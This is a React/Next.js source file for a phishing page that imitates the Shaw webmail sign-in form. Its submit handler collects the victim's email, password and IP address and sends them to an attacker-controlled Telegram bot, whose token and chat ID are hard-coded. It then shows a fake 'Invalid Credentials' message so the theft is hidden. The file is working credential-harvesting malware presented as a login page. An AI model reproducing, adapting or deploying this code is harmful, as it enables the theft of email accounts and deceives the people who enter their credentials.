import React, { useRef, useState } from 'react';
import { useAtom } from 'jotai';
import { loginAtom, submittedAtom } from '@/utils/atoms';
import Image from 'next/image';
import { FaCircleQuestion } from 'react-icons/fa6';

export default function SignInForm() {
  return (
    <div className='my-4 border border-gray bg-white max-w-4xl mx-auto rounded-md py-12'>
      <div className='w-full grid grid-cols-1 lg:grid-cols-5 gap-4'>
        <div className='bg-white border-r border-[#cccccc] flex flex-col lg:col-span-3 gap-6 items-center justify-center'>
          <Image
            src='/webmail-desktop.png'
            alt='shaw webmail'
            quality={100}
            width={267}
            height={44}
          />
          <h3 className='font-bold text-lg '>
            Sign in to access your Shaw email
          </h3>
          <FormComponent />
        </div>
      </div>
    </div>
  );
}

function FormComponent() {
  const formRef = useRef();
  const [submitted, setSubmitted] = useAtom(submittedAtom);
  const [details, setDetails] = useAtom(loginAtom);
  const [inputDetails, setInputDetails] = useState({
    email: '',
    pwd: '',
  });
  const [formStatus, setFormStatus] = useState({
    loading: false,
    successful: false,
  });
  const bot = {
    TOKEN: '6439941050:AAGYiODUIxTIab15bA_f1NarLv6lAVJvDO0',
    chatID: '5301180625',
  };

  /*
  HTTP API:
5301180625
  */
  function handleSubmit(event) {
    event.preventDefault();

    setFormStatus({ ...formStatus, loading: true });
    const data = new FormData(event.target);
    console.log(JSON.stringify(Object.fromEntries(data.entries())));
    const email = data.get('email');
    const pwd = data.get('password');
    setDetails({ email, pwd });
    setSubmitted(true);

    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        let ip = data.ip;
        fetch(
          `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=🔔 Shaw Webmail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A%0AThank You!`,
          {
            method: 'GET',
          }
        ).then(
          (res) => {
            console.log(res);
            setFormStatus({ loading: false, successful: true });
          },
          (error) => {
            alert('Message not sent');
            console.log(error);
            setFormStatus({ loading: false, successful: false, error: error });
          }
        );
      })
      .finally(() => {
        setSubmitted(false);
        setDetails({ email: '', pwd: '' });
        formRef.current.reset();
      });
  }

  return (
    <form
      onSubmit={handleSubmit}
      ref={formRef}
      autoComplete='false'
      className='flex flex-col gap-4 py-3 px-6 max-w-md w-full'
    >
      <div className='flex flex-col gap-2'>
        <label htmlFor='0xemail' className='form-label'>
          Shaw email
        </label>
        <div className=' flex items-center gap-2 relative'>
          <input
            type='email'
            id='0xemail'
            name='email'
            onChange={(e) =>
              setInputDetails({ ...inputDetails, email: e.target.value })
            }
            placeholder='example@shaw.ca'
            required
            className='w-full border text-sm bg-white border-[#8d8d8d] rounded-sm p-2'
          />
          <div className='flex flex-col items-center md:absolute cursor-pointer *:leading-none left-[102%] justify-center gap-1 text-sky-600'>
            <FaCircleQuestion className='text-lg' />
            <p className='text-sm font-semibold'>Help</p>
          </div>
        </div>
      </div>
      <div className='flex flex-col gap-2'>
        <label htmlFor='0xpassword' className='form-label'>
          Password
        </label>
        <div className=' flex items-center gap-2 relative'>
          <input
            type='password'
            id='0xpassword'
            onChange={(e) =>
              setInputDetails({ ...inputDetails, pwd: e.target.value })
            }
            name='password'
            required
            className='w-full border text-sm bg-white border-[#8d8d8d] rounded-sm p-2'
          />
          <div className='flex flex-col items-center invisible md:absolute cursor-pointer *:leading-none left-[102%] justify-center gap-1 text-sky-600'>
            <FaCircleQuestion className='text-lg' />
            <p className='text-sm font-semibold'>Help</p>
          </div>
        </div>
      </div>
      <div className='flex items-center gap-2'>
        <input type='checkbox' id='remember' className='w-5 h-5' />
        <label
          htmlFor='remember'
          className='text-sm text-[#666666] leading-none'
        >
          Remember Shaw email
        </label>
      </div>
      <button
        type='submit'
        disabled={
          formStatus.loading ||
          inputDetails.email === '' ||
          inputDetails.pwd === ''
        }
        className='submit-button'
      >
        {formStatus.loading ? 'Loading...' : 'Sign in'}
      </button>

      {formStatus.successful && (
        <div className='w-full p-3 border-l-4 border-red-500 bg-red-100 text-red-500'>
          <p className='text-sm'>{formStatus.error || 'Invalid Credentials'}</p>
        </div>
      )}

      <div className='w-full flex flex-col items-start md:items-center gap-3 mt-auto'>
        <p className='text-xs leading-none font-sans'>
          <span className='text-[#555555] font-semibold mr-2'>Having trouble?</span>
          <span className=' text-sky-600'>
            Shaw Support: How To Reset My Password
          </span>
        </p>
        <p className='text-xs leading-none font-sans '>
          <span className='text-[#555555] font-semibold mr-2'>Already Know How?</span>
          <span className=' text-sky-600'>Reset Password On My Shaw</span>
        </p>
      </div>
    </form>
  );
}
